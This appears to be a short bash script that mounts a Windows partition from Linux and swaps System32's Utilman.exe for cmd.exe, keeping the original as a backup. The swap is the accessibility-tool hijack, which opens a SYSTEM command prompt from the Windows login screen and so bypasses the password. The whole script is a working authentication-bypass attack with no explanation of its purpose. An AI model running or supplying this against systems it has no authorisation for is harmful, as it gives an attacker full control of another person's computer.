#!/bin/bash

fdisk -l

mount -t ntfs3 /dev/sdaX /mnt/windows

cd /mnt/windows/Windows/System32 \
    && mv -v Utilman.exe Utilman.exe.or \
    && cp -v cmd.exe Utilman.exe \
    && echo 'OK'
